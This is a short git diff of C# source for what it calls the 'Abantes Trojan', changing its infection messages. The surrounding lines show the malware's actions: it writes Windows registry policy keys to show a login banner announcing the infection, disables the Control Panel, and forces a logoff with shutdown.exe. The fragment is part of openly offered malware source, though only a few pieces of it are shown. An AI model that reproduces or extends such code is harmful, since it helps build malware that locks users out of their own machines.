@@ -56,10 +56,10 @@ namespace Abantes
                 editKey.Close();
 
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                editKey.SetValue("legalnoticecaption", "Important Information");
+                editKey.SetValue("legalnoticecaption", "Welcome To Hell");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Now Enjoy Your Broken and Unusable PC");
+                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Hope You Enjoy.");
                 editKey.Close();
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 editKey.SetValue("NoControlPanel", "1");
@@ -202,7 +202,7 @@ namespace Abantes
 
                 Thread.Sleep(9000);
 
-                MessageBox.Show("Abantes Wants To Meet You","I Want Too Meet You");
+                MessageBox.Show("Abantes Wants To Meet You","Abantes Want Too Meet You");
 
                 Others.StartProcess("shutdown.exe", "/l /f");
             }
